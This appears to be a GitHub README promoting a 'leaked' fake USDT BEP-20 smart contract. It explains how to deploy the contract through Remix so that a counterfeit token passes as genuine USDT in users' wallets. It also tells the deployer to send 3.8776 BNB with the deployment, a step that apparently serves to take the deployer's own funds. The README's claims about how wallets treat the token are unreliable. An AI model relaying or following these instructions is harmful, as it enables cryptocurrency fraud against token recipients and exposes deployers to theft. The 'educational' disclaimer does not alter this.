# 🛑 Leaked Smart Contract for Fake USDT Worth $10,000 (Danger: Imitates USDT BEP-20) 🛑

![Smart Contract Image](https://github.com/user-attachments/assets/1524a6f8-5e5c-4ddc-b88f-d81f2fe7d618)

This smart contract is a **dangerous fake**, designed to imitate the behavior of the legitimate USDT on the BEP-20 standard. It is crafted to deceive users into believing it is a genuine token.

> **Important:** This contract is created strictly for educational purposes and demonstrates how unethical developments can exploit the trust of blockchain users.

---

## **Contract Features**

### **Mimics Original USDT**
- **Ticker:** `USDT`
- **Standard:** BEP-20
- Visually and functionally similar to the legitimate USDT contract.

### **Key Threats**
1. **Cold wallets** (e.g., Trust Wallet, MetaMask, Coinbase Wallet) accept this token as genuine USDT. Swaps result in errors, but the balance still appears and doesn’t disappear. If the user holds real USDT, the fake USDT balance gets added to it.
2. Simulates transactions using common methods like `transfer`, `approve`, `allowance`.
3. Creates false trust by replicating events and data identical to original tokens.

---

## **Usage Instructions**

1. **Copy the Code**
   - Copy the code from the file `TetherUSD.sol` into your project.

2. **Deploy the Contract**
   - Deploy the contract on the blockchain via [Remix Ethereum IDE](https://remix.ethereum.org/).

3. **Compile the Contract**
   - Compile the contract using the Remix IDE.

4. **Set the Value**
   - In the `Value` field, input `3877600000000000000 Wei` (3.8776 BNB). This is the required amount to create tokens priced at $1 per USDT. 
   - **Warning:** If your wallet lacks 3.8776 BNB, the transaction will fail, and you may lose funds.
   
   ![Value Input Screenshot](https://github.com/user-attachments/assets/36f3e062-db91-44d1-9bf6-a3175c8a540c)

5. **Deploy and Sign the Transaction**
   - Deploy the contract and sign the transaction using Trust Wallet or MetaMask.
   
   ![Deployment Screenshot 1](https://github.com/user-attachments/assets/733310d5-066f-486a-8a98-83b4ecca3745)
   
   ![Deployment Screenshot 2](https://github.com/user-attachments/assets/861ff7df-36c2-4737-94b2-dd6d06b969b2)

---

## **Technical Details**
- **Total Supply:** 1,000,000 USDT (1 million tokens)
- **Decimals:** 6 (same as the original USDT)
- **Token Allocation:** All tokens will be held in the creator's wallet.
